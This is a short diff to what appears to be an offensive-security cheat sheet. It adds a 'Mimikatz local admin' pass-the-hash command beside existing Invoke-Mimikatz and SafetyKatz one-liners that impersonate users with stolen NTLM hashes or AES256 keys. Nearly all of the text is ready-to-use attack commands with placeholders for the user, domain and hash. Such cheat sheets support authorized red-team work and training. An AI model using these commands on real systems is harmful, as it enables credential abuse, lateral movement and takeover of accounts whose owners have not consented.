@@ -85,6 +85,11 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:powershell.exe"'
 ```
 
+#### Mimikatz local admin
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<COMPUTERNAME> /ntlm:<HASH> /run:powershell.exe"'
+```
+
 #### SafetyKatz
 ```
 SafetyKatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256KEYS> /run:cmd.exe" "exit" 
